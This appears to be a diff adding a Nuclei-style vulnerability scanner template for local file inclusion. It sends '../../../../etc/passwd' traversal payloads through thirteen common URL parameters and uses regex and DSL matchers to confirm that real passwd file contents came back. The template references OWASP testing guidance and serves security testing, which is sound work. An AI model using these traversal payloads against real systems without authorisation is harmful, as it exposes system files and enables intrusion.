@@ -1,0 +1,39 @@
+id: m7-lfi-unix-passwd
+info:
+  name: M7 - LFI /etc/passwd with Proof Verification
+  author: Sharlix
+  severity: critical
+  description: LFI detection requiring actual /etc/passwd structure, not just filename match
+  tags: lfi,unix,m7hunter
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=../../../../etc/passwd"
+      - "{{BaseURL}}?page=../../../../etc/passwd"
+      - "{{BaseURL}}?path=../../../../etc/passwd"
+      - "{{BaseURL}}?include=../../../../etc/passwd"
+      - "{{BaseURL}}?template=../../../../etc/passwd"
+      - "{{BaseURL}}?filename=../../../../etc/passwd"
+      - "{{BaseURL}}?view=../../../../etc/passwd"
+      - "{{BaseURL}}?doc=../../../../etc/passwd"
+      - "{{BaseURL}}?read=../../../../etc/passwd"
+      - "{{BaseURL}}?lang=../../../../etc/passwd"
+      - "{{BaseURL}}?content=../../../../etc/passwd"
+      - "{{BaseURL}}?module=../../../../etc/passwd"
+      - "{{BaseURL}}?load=../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:x?:\d+:\d+:"
+          - "daemon:[^:]+:\d+:\d+:"
+        part: body
+        condition: or
+
+      - type: dsl
+        dsl:
+          - "contains(body, '/bin/bash') || contains(body, '/bin/sh') || contains(body, '/sbin/nologin')"
